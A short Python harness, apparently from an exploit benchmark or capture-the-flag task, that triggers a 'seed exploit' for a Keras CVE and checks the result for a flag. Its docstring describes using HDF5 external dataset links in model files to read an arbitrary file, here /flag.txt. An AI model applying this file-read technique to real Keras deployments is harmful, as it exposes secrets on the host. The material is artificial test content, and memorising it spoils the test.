#!/usr/bin/env python3
"""[GIVEN] CVE-2026-1669 seed exploit for keras-cve-2026-12480.

HDF5 EXTERNAL dataset links: the weight dataset data is read from /flag.txt
(the external file). On v0 (3.13.1) no check exists; on v1 (3.13.2) the
CVE-2026-1669 fix rejects dataset.external.
"""
import sys
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import keras_util as u  # noqa: E402


def candidate(*, version="v1", flag=None):
    try:
        urllib.request.urlopen(f"{u.BASE[version]}/exploit?mode=seed", timeout=60).read()
    except Exception:
        pass
    out = u.read_result(version)
    return {"ok": (flag in out) if flag else bool(out), "result": out[:100]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
